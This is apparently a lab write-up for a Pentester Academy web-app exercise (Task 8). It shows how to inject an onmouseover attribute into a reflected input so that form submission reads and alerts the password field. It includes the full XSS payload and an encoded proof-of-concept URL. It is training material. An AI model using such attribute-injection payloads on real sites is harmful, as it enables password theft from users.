## Task 8 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/8)</small>

Objectives:

1. Pop the password in an alert box when the user submits the form

So again event handling thing it is. Whenever you click on submit button inside the form, it triggers `submit` event. By default submit will send all data to _action_ as per specified in _method_.

You can use `.addEventListener()` to alert the password and then let the form submit

It is reflecting the query parameter in the input and escaping html characters. So using attributes events [onmouseover](https://www.w3schools.com/tags/ev_onmouseover.asp) I was able to complete the objectives

![](https://i.imgur.com/DTdmjix.png)

So the payload for it is

```js
" onmouseover="document.forms[0].addEventListener('submit', function(){ alert(document.querySelector('input[type=password]').value) })
```

**NOTE** I could have used `() =>` arrow function, to make the payload shorter, but the server is escaping all these characters.

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/8?email=%22%20onmouseover%3D%22document.forms%5B0%5D.addEventListener%28%27submit%27%2C%20function%28%29%7B%20alert%28document.querySelector%28%27input%5Btype%3Dpassword%5D%27%29.value%29%20%7D%29&password=hello)
